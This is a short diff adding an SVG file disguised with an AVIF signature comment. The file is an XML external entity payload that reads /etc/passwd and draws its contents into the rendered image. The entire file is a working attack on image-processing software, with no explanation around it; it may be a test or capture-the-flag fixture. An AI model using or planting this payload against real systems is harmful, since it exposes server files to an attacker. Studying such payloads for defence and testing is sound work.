@@ -1,0 +1,6 @@
+<!--ftypavif--><?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY e SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="900" height="140">
+<rect width="900" height="140" fill="#ffffff"/>
+<text x="10" y="105" font-family="DejaVu Sans Mono, monospace" font-size="90" fill="#000000">&e;</text>
+</svg>
